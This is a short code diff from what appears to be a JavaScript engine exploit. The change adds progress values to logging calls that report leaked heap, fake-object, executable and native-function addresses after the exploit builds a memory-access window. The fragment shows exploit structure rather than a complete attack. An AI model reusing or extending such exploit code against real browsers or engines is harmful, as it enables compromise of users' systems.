@@ -670,15 +670,15 @@ function finishAttempt(outcome, holderAddress, fakeAddress) {
   settleResolve = null;
   if (resolve !== null) resolve(createMemoryWindow(holderAddress));
 
-  emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info");
-  emit("host_addr", hex(fakeAddress - 0x10), "info");
-  emit("holder_addr", hex(holderAddress), "info");
-  emit("fake_addr", hex(fakeAddress), "info");
-  emit("view_vector", hex(outcome.originalVector), "info");
-  emit("function_addr", hex(outcome.functionAddress), "info");
-  emit("executable_addr", hex(outcome.executableAddress), "info");
-  emit("native_function", hex(outcome.nativeInfo.nativeFunction), "info");
-  emit("native_constructor", hex(outcome.nativeInfo.nativeConstructor), "info");
+  emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info", 30);
+  emit("host_addr", hex(fakeAddress - 0x10), "info", 35);
+  emit("holder_addr", hex(holderAddress), "info", 40);
+  emit("fake_addr", hex(fakeAddress), "info", 45);
+  emit("view_vector", hex(outcome.originalVector), "info", 50);
+  emit("function_addr", hex(outcome.functionAddress), "info", 55);
+  emit("executable_addr", hex(outcome.executableAddress), "info", 60);
+  emit("native_function", hex(outcome.nativeInfo.nativeFunction), "info", 65);
+  emit("native_constructor", hex(outcome.nativeInfo.nativeConstructor), "info", 70);
 }
 
 function createMemoryWindow(holderAddress) {
